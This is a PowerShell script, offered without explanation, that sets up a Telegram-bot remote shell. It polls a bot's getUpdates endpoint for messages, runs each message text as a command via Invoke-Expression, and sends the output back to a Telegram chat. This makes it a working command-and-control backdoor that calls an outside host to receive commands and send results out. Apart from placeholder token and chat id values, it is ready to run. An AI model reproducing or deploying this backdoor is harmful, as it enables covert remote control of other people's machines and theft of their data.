
$apiToken = "your Telegram Token"
$chat_id = "chat id to your Telegram group"

function read-comm()
{
    Param
    (
       [Parameter(Mandatory=$true, Position=0)]
        $apiToken,
        [Parameter(Mandatory=$true, Position=1)]
        [string] $offset
   )
    $url="https://api.telegram.org/bot$apiToken/getUpdates?offset=$offset"
    write-host $url
    $r=Invoke-WebRequest -Uri $url -UseBasicParsing
    $test = $r | ConvertFrom-Json
    $message = $test.result.message[-1]
    $message = $message.text
    $offset = $test.result.update_id[-1]
    return $message, $offset
}



function Excmd
{

   param
   (
          [Parameter(Mandatory)]
      [string] $command
    )

   write-host $command 
   $out = Invoke-Expression -Command $command | Out-String
   return $out
}

function Send-data ($data,$apiToken,$chat_id)
{
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$data"
    write-host $url
    Invoke-WebRequest -Uri $url
    return $data
}


function First-offset
{
    Param
    (
         [Parameter(Mandatory=$true, Position=0)]
         [string] $apiToken
    )

    $url = "https://api.telegram.org/bot$apiToken/getUpdates?offset="
    $r=Invoke-WebRequest -Uri $url -UseBasicParsing | ConvertFrom-Json
    $Foffset = $r.result.update_id
    $foo = $Foffset[-1]
    if ($foo.ToString().Length -gt 1)
    {
        return $foo
    }
    else
    {
        return $Foffset
    }

}


function start-myshell
{
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string] $apiToken,
        [Parameter(Mandatory=$true, Position=1)]
        [string] $chat_id
    )

    $foo=0
    $offset = First-offset $apiToken
    while ($true)
    {
        try
        {   
            
            $message = read-comm -apiToken $apiToken -offset $offset
            $offset = $message[1]
            if ($offset.contains(" "))
            {
                $offset = -split $offset
                $offset = $offset[-1]
            }

            write-host $offset
            if (-not($offset -eq $foo))
            {
                $foo=$offset
                $command = $message[0]
                $output = Excmd $command
                Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                write-host $command
            }
            Start-Sleep -Seconds 0.3
        }    
        
        catch 
        {
            write-host($Error[0].Exception)
        }
        
    }

}
   
